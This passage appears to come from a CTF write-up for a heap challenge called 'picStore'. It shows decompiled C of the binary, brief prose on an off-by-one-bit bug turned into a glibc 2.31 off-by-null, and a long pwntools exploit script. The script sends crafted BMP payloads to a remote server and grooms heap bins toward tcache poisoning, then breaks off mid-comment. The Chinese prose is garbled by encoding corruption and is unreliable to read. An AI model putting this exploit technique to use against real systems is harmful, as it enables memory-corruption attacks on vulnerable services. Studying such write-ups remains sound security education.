class="hljs-type">unsigned</span> __int64 v29; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span><br><br>  v29 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  ptr = <span class="hljs-string">&#x27;MB&#x27;</span>;<br>  v5 = *current_position;<br>  v27 = <span class="hljs-number">0</span>;<br>  v6 = *note_size;<br>  v21 = <span class="hljs-number">0LL</span>;<br>  v22 = <span class="hljs-number">0LL</span>;<br>  v7 = <span class="hljs-number">0x1200</span>;<br>  v23 = <span class="hljs-number">0LL</span>;<br>  v25 = <span class="hljs-number">0x12F6</span>;<br>  <span class="hljs-keyword">if</span> ( v6 - <span class="hljs-number">8</span> * v5 &lt;= <span class="hljs-number">4608</span> )<br>    v7 = v6 - <span class="hljs-number">8</span> * v5;<br>  v28 = <span class="hljs-number">54</span>;<br>  <span class="hljs-keyword">if</span> ( v5 )<br>    LOWORD(v6) = v7;<br>  v8 = v7;<br>  v18 = v7;<br>  v26 = v6;<br>  fwrite(&amp;ptr, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0xE</span>uLL, stream);<br>  *(_QWORD *)&amp;v21 = <span class="hljs-number">0x5000000028</span>LL;<br>  *((_QWORD *)&amp;v21 + <span class="hljs-number">1</span>) = <span class="hljs-number">0x18000100000014</span>LL;<br>  DWORD1(v22) = <span class="hljs-number">4800</span>;<br>  fwrite(&amp;v21, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x28</span>uLL, stream);<br>  v19 = v8 != <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0LL</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v13 = bmp_model[v9];<br>    <span class="hljs-keyword">if</span> ( v18 &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v9 &amp;&amp; v19 )<br>    &#123;<br>      v14 = v9 + <span class="hljs-number">54</span>;<br>      <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    v11 = *note;<br>    v12 = *current_position;<br>    v20 = v13 &amp; <span class="hljs-number">0xFE</span>;<br>    LODWORD(v12) = *(<span class="hljs-type">unsigned</span> __int8 *)(v11 + v12);<br>    LOBYTE(v11) = v10++;<br>    v20 = ((<span class="hljs-type">int</span>)v12 &gt;&gt; v11) &amp; <span class="hljs-number">1</span> | v13 &amp; <span class="hljs-number">0xFE</span>;<br>    fwrite(&amp;v20, <span class="hljs-number">1uLL</span>, <span class="hljs-number">1uLL</span>, stream);<br>    <span class="hljs-keyword">if</span> ( v10 == <span class="hljs-number">8</span> )<br>    &#123;<br>      ++*current_position;<br>      v10 = <span class="hljs-number">0</span>;<br>    &#125;<br>    ++v9;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 != <span class="hljs-number">4608</span> );<br>  v13 = byte_71400;<br>  v14 = <span class="hljs-number">4662</span>;<br>LABEL_12:<br>  v15 = &amp;bmp_model[v14];<br>  v16 = &amp;v15[<span class="hljs-number">0x12F5</span> - v14];<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v20 = v13;<br>    fwrite(&amp;v20, <span class="hljs-number">1uLL</span>, <span class="hljs-number">1uLL</span>, stream);<br>    <span class="hljs-keyword">if</span> ( v16 == v15 )<br>      <span class="hljs-keyword">break</span>;<br>    v13 = *(v15 - <span class="hljs-number">53</span>);<br>    ++v15;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é¢˜æˆ‘çš„å»ºè®®æ˜¯è®¤çœŸçœ‹ä»£ç ï¼Œå¿…é¡»é™ä¸‹å¿ƒæ¥çœ‹ï¼Œç”±äºå¾ˆèœå‡ ä¹æ²¡æœ‰çš„é€†å‘æŠ€èƒ½ï¼Œæˆ‘ä¸€æ•´ä¸ªç™½å¤©åŸºæœ¬å°±åœ¨çœ‹è¿™é¢˜ orzã€‚</p><p>å¤§æ¦‚å®ç°çš„åŠŸèƒ½å°±æ˜¯ <code>upload()</code> æ˜¯é¦–å…ˆå¿…é¡»æ‘¸æ¸…æ¥šæ ¼å¼ï¼Œä¹‹åæ˜¯ä¸€ä¸ªæŒ‰ <code>bit</code> è¯»çš„è¿‡ç¨‹ï¼Œ<code>download()</code> æ˜¯æ ¹æ®å½“å‰ <code>bit</code> æ˜¯å¦ä¸º <code>1</code> æ¥å†³å®šè¾“å‡º <code>\xff</code> è¿˜æ˜¯ <code>\xfe</code>ã€‚</p><p>æˆ‘ä¸ªäººè®¤ä¸ºè¿™é¢˜æ˜¯éå¸¸é˜´é—´çš„ï¼Œé¦–å…ˆä»–çš„æ´éå¸¸é˜´é—´ï¼š</p><p>åœ¨ <code>upload()</code> é‡Œ <code>if ( row_index + 8 * (int)pixel_value &lt;= *output_size )</code>  å¾ˆå¤šæœ‹å‹çœ‹åˆ°äº†å°±æœ‰ååº”æ˜¯ <code>Off by one bit</code>ï¼Œä½†å¯æƒœçš„æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹è§¦å‘ä¸åˆ°è¿™é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( pixel_index == image_size )<br>  <span class="hljs-keyword">goto</span> LABEL_20;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥è§¦å‘å‘¢ï¼Ÿå½“ <code>image_size</code> &gt; <code>0x1200</code> ï¼ˆå®é™… <code>malloc(size)</code> ä¸­ <code>size &gt; 0x240</code>ï¼‰æ—¶ï¼š</p><p>ä¸ä¼šè¿›å…¥ä¸‹é¢çš„é€»è¾‘ï¼Œæ„æ€æ˜¯ä¸ä¼šç»ˆæ­¢ï¼Œè€Œæ˜¯å¼€å§‹æ–°ä¸€è½®çš„è¯»å…¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (note_size_copy != <span class="hljs-number">0x1200</span> * (note_size_copy / <span class="hljs-number">0x1200</span>)) + note_size_copy / <span class="hljs-number">0x1200</span> &lt;= ++iterator )<span class="hljs-comment">// If the unpacked string is too long</span><br>&#123;<br>  *note_size = v4;<br>  note_size_copy = v4;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç¬¬äºŒéä¸ä¼šé‡æ–°ç”³è¯·å †å—å¹¶è®¾ç½®å¤§å°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *output_size )<br>&#123;<br>  image_size = type;<br>  <span class="hljs-keyword">goto</span> LABEL_6;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>image_size</code> ç”±äºè¿™ä¸ªä¾‹å­ä¸­æ˜¯åˆ†æ®µè¯»å…¥ï¼Œæ‰€ä»¥ä¸å¯èƒ½åœ¨ä¸Šé¢é‚£ä¸ªåˆ¤æ–­æ–­ä¸‹æ¥ï¼Œå› æ­¤æ„æˆ <code>Off by one bit</code>ã€‚</p><p>ï¼ˆ<strong>Nightu</strong>ï¼‰ğŸ‘¦ğŸ»ğŸ‘‹ğŸ»ğŸ‘´ğŸ»(<strong>Mr.R</strong>)</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä»– <code>download()</code> é‡Œé¢çš„ size æ˜¯æ ¹æ®ä½ å®é™…è¾“å…¥çš„æ¥åˆ¤æ–­ï¼Œæ‰€ä»¥å¦‚æœè¦ leak è¯·é¢„å…ˆå†™ç‚¹ä¸œè¥¿ qwqã€‚</p><p>å½³äºäº†ï¼Œå†™å¥½äº¤äº’åè½¬åŒ–ä¸ºå¸¸è§„çš„ 2.31 çš„ <code>Off by null</code>ã€‚æ²¡ leak çš„é‚£ç§ï¼Œé£æ°´å¤§èµ›äº†åˆæ˜¯ =ã€‚=</p><p>ç›´æ¥æŠ„ä½œä¸šå°±è¡Œï¼š</p><p><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass - WJHâ€™S</a></p><p><a href="https://tttang.com/archive/1614/">glibc2.29+çš„off by nullåˆ©ç”¨ - cru5h</a></p><p>åŠ ç‚¹æ³¨é‡Šï¼Œè¿™æ ·ä¸€ä¸‹é‚£æ ·ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./picStore&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = remote(<span class="hljs-string">&quot;190.92.238.134&quot;</span>,<span class="hljs-number">6679</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">data</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sea(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2bits</span>(<span class="hljs-params">s</span>):<br>    ans = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        ans += <span class="hljs-string">&quot;&#123;:08b&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(i))[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rcv_leak</span>(<span class="hljs-params">s</span>):<br>    ans = <span class="hljs-string">&#x27;&#x27;</span><br>    tmp_s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;\xfe&#x27;</span>:<br>            tmp_s += <span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;\xff&#x27;</span>:<br>            tmp_s += <span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp_s) == <span class="hljs-number">8</span>:<br>            ans += p8(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0b&#x27;</span>+tmp_s[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>))<br>            tmp_s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_bmp</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span>,data_px240=<span class="hljs-string">&#x27;&#x27;</span>,data_px480=<span class="hljs-string">&#x27;&#x27;</span></span>):<br><br>    <span class="hljs-keyword">assert</span>(size &lt;= <span class="hljs-number">0x6c0</span>),<span class="hljs-string">&quot;Too big size!No need!&quot;</span><br>    <span class="hljs-keyword">assert</span>(size % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>),<span class="hljs-string">&quot;Sorry we can only malloc 8*n.&quot;</span><br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    [*] size &lt;= 0x240</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0x240</span>:<br>        data = data[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;\x00&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        data = data<br>    header_size = <span class="hljs-number">0</span>                     <span class="hljs-comment"># Useless</span><br>    image_offset = <span class="hljs-built_in">len</span>(data) &lt;&lt; <span class="hljs-number">3</span>       <span class="hljs-comment"># Control where to Stop 1</span><br>    image_width = <span class="hljs-number">0x111</span><br>    num_colors = <span class="hljs-number">0x222</span>                  <span class="hljs-comment"># Control where to Stop 2</span><br><br>    begin_with = <span class="hljs-string">&#x27;BM&#x27;</span> + p32(image_offset) + p16(size &lt;&lt; <span class="hljs-number">3</span>) + p16(<span class="hljs-number">0xdead</span>) + p32(header_size)<br><br>    header = <span class="hljs-string">&#x27;Nu1L&#x27;</span> + p32(image_width) + p32(num_colors)<br>    header = header.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;U&#x27;</span>) + str2bits(data)<br>    bmp = begin_with + header<br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0x240</span>:<br>        <span class="hljs-keyword">return</span> bmp<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    [*] 0x240 &lt; size &lt;= 0x480</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0x240</span> &lt; size &lt;= <span class="hljs-number">0x480</span>:<br>        data_px240 = data_px240[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;\x00&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        data_px240 = data_px240<br>    header_size = <span class="hljs-number">0</span>                     <span class="hljs-comment"># Useless</span><br>    image_offset = <span class="hljs-built_in">len</span>(data_px240) &lt;&lt; <span class="hljs-number">3</span>  <span class="hljs-comment"># Control where to Stop 1</span><br>    image_width = <span class="hljs-number">0x111</span><br>    num_colors = <span class="hljs-number">0x222</span>                  <span class="hljs-comment"># Control where to Stop 2</span><br><br>    begin_with = <span class="hljs-string">&#x27;BM&#x27;</span> + p32(image_offset) + p16(<span class="hljs-number">0xbeef</span>) + p16(<span class="hljs-number">0xdead</span>) + p32(header_size)<br><br>    header = <span class="hljs-string">&#x27;Nu1L&#x27;</span> + p32(image_width) + p32(num_colors)<br>    header = header.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;U&#x27;</span>) + str2bits(data_px240)<br>    bmp += begin_with + header<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0x240</span> &lt; size &lt;= <span class="hljs-number">0x480</span>:<br>        <span class="hljs-keyword">return</span> bmp<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    [*] 0x480 &lt; size &lt;= 0x6c0</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0x480</span> &lt; size &lt;= <span class="hljs-number">0x6c0</span>:<br>        data_px480 = data_px480[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;\x00&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        data_px480 = data_px480<br>    header_size = <span class="hljs-number">0</span>                             <span class="hljs-comment"># Useless</span><br>    image_offset = <span class="hljs-built_in">len</span>(data_px480) &lt;&lt; <span class="hljs-number">3</span>         <span class="hljs-comment"># Control where to Stop 1</span><br>    image_width = <span class="hljs-number">0x111</span><br>    num_colors = <span class="hljs-number">0x222</span>                          <span class="hljs-comment"># Control where to Stop 2</span><br><br>    begin_with = <span class="hljs-string">&#x27;BM&#x27;</span> + p32(image_offset) + p16(<span class="hljs-number">0xbeef</span>) + p16(<span class="hljs-number">0xdead</span>) + p32(header_size)<br><br>    header = <span class="hljs-string">&#x27;Nu1L&#x27;</span> + p32(image_width) + p32(num_colors)<br>    header = header.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;U&#x27;</span>) + str2bits(data_px480)<br>    bmp += begin_with + header<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0x480</span> &lt; size &lt;= <span class="hljs-number">0x6c0</span>:<br>        <span class="hljs-keyword">return</span> bmp<br><br>add = <span class="hljs-keyword">lambda</span> size,data=<span class="hljs-string">&#x27;&#x27;</span>,data_px240=<span class="hljs-string">&#x27;&#x27;</span>,data_px480=<span class="hljs-string">&#x27;&#x27;</span>: upload(make_bmp(size,data,data_px240,data_px480))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[!] Exploit Begin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Stage 1: Fill useless Unsortedbin and tcache</span><br><span class="hljs-string">These sizes can be changed after later unlink to help to do Tcache Poisoning.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x5d8</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x240</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x240</span>,<span class="hljs-string">&quot;C&quot;</span>*(<span class="hljs-number">0x5d8</span> - <span class="hljs-number">0x240</span>*<span class="hljs-number">2</span>))    <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x208</span>)                        <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x108</span>)                                  <span class="hljs-comment"># 2 </span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Stage 2: Heap Fengshui</span><br><span class="hljs-string">https://tttang.com/archive/1614/</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># step1 P&amp;0xff = 0</span><br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span>)   <span class="hljs-comment"># 3 A = P-&gt;fd</span><br>add(<span class="hljs-number">0x108</span>)              <span class="hljs-comment"># 4 barrier</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&quot;B0&quot;</span>*<span class="hljs-number">0x100</span>)  <span class="hljs-comment"># 5 B0 helper</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&quot;C0&quot;</span>*<span class="hljs-number">0x100</span>)  <span class="hljs-comment"># 6 C0 = P , P&amp;0xff = 0</span><br>add(<span class="hljs-number">0x308</span>, <span class="hljs-string">&#x27;7&#x27;</span>*<span class="hljs-number">0x100</span>)   <span class="hljs-comment"># 7 barrier</span><br>add(<span class="hljs-number">0x488</span>, <span class="hljs-string">&quot;H&quot;</span>*<span class="hljs-number">0x100</span>)   <span class="hljs-comment"># 8 H0. helper for write bk-&gt;fd. vitcim chunk.</span><br>add(<span class="hljs-number">0x428</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x100</span>)   <span class="hljs-comment"># 9 D = P-&gt;bk</span><br>add(<span class="hljs-number">0x108</span>)              <span class="hljs-comment"># 10 barrier</span><br><br><span class="hljs-comment"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span><br>dele(<span class="hljs-number">0</span>+<span class="hljs-number">3</span>) <span class="hljs-comment"># A</span><br>dele(<span class="hljs-number">3</span>+<span class="hljs-number">3</span>) <span class="hljs-comment"># C0</span><br>dele(<span class="hljs-number">6</span>+<span class="hljs-number">3</span>) <span class="hljs-comment"># D</span><br><br><span class="hljs-comment"># unsortedbin: D-C0-A   C0-&gt;FD=A</span><br>dele(<span class="hljs-number">2</span>+<span class="hljs-number">3</span>) <span class="hljs-comment"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span><br><br><br>add(<span class="hljs-number">0x458</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>, <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x438</span>-<span class="hljs-number">0x240</span>) + p64(<span class="hljs-number">0x751</span>)[:-<span class="hljs-number">2</span>])  <span class="hljs-comment"># 3 put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span><br><br><span class="hljs-comment"># recovery</span><br>add(<span class="hljs-number">0x418</span>)                  <span class="hljs-comment"># 5 C1 from ub</span><br>add(<span class="hljs-number">0x428</span>)                  <span class="hljs-comment"># 6 bk  D  from largebin</span><br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0x100</span>)        <span class="hljs-comment"># 9 fd  A from largein</span><br><br><span class="hljs-comment"># step3 use unsortedbin to set fd-&gt;bk</span><br><span class="hljs-comment"># partial overwrite fd -&gt; bk </span><br>dele(<span class="hljs-number">9</span>) <span class="hljs-comment"># A=P-&gt;fd</span><br>dele(<span class="hljs-number">5</span>) <span class="hljs-comment"># C1</span><br><span class="hljs-comment"># 